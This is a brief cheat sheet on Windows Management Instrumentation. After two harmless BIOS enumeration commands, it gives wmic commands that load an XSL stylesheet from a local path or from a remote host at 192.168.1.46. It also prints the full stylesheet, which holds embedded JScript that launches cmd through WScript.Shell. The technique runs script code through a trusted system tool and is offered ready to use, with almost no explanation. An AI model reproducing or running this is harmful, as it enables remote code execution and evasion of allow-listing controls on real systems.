## Windows Management Instrumentation (WMI)

is the infrastructure for management data and operations on Windows-based operating systems. You can write WMI scripts or applications to automate administrative tasks on remote computers

### Enum

```
Get-WmiObject -Class Win32_Bios | Format-List -Property *
```

```
Get-CimInstance -ClassName Win32_BIOS
```

```

```

### Run xml  file

```cmd
wmic os get /FORMAT:"nooranet.xsl"
```

```cmd
wmic os get /FORMAT:.\nooranet
```

```cmd
wmic os get /FORMAT:"https://192.168.1.46/nooranet.xsl"
```

* `xsl`
    An XSL file is a style sheet that can be used to transform XML documents into other document types and to format the output.

* `nooranet.xsl`
  
  ```xml
  <?xml version='1.0'?>
  <stylesheet
  xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
  xmlns:user="placeholder"
  version="1.0">
  <output method="text"/>
    <ms:script implements-prefix="user" language="JScript">
    <![CDATA[
    var r = new ActiveXObject("WScript.Shell").Run("cmd");
    ]]> </ms:script>
  </stylesheet>
  ```
